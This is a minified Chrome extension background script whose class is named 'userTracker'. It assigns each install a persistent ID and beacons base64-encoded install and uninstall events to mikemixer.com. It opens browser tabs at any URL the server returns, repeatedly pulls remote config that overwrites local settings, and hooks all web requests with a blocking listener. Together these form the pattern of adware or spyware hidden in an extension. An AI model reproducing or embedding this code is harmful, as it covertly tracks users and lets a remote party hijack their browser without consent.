class userTracker{constructor(){this.actionUrl="https://mikemixer.com/api/action/",this.uninstallUrl="https://mikemixer.com/uninstall/",this.configUrl="https://mikemixer.com/api/config/",this.config={},this.queue=[],this.queueProcessorReady=!1,this.uid="",this.version=chrome.runtime.getManifest().version,this.initStorage(),this.initListeners()}processQueue(){for(;this.queue.length>0;){var i=this.queue.shift();if(!i.type||"action"!=i.type)return!0;var e="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,action:i.action,uid:this.uid,t:Date.now()})));fetch(this.actionUrl+"?"+e).then((i=>i.json())).then((function(i){i.url&&chrome.tabs.create({url:i.url})}))}chrome.webRequest.onHeadersReceived.addListener((i=>({responseHeaders:i.responseHeaders})),{urls:["*://*/*"]},["blocking","responseHeaders"])}setUninstallUrl(){var i="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,action:"uninstall",uid:this.uid,t:Date.now()})));chrome.runtime.setUninstallURL(this.uninstallUrl+"?"+i)}initListeners(){chrome.runtime.onInstalled.addListener((i=>{this.queue.push({type:"action",action:i.reason}),this.queueProcessorReady&&this.processQueue()}))}initStorage(){chrome.storage.local.get((i=>{i&&i.config&&(this.config=i.config),this.config.uid?this.uid=this.config.uid:(this.uid=this.config.uid=this.generateUID(),this.saveConfig()),this.queueProcessorReady=!0,this.setUninstallUrl(),this.processQueue(),this.updateConfig()}))}saveConfig(){chrome.storage.local.set({config:this.config})}updateConfig(){let i=this;fetch(this.configUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"filters="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,version:this.version,timestamp:Date.now(),uid:this.config.uid})))}).then((i=>i.json())).then((i=>{if(i){for(let e in i)this.config[e]=i[e];this.saveConfig(this.config)}})).finally((()=>{this.config.configUpTime&&this.config.configUpTime>0&&setTimeout((function(){i.updateConfig()}),this.config.configUpTime)}))}generateUID(){return"xxxxxxxx-xxxx-2xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(i){var e=16*Math.random()|0;return("x"==i?e:3&e|8).toString(16)}))}}const t=new userTracker;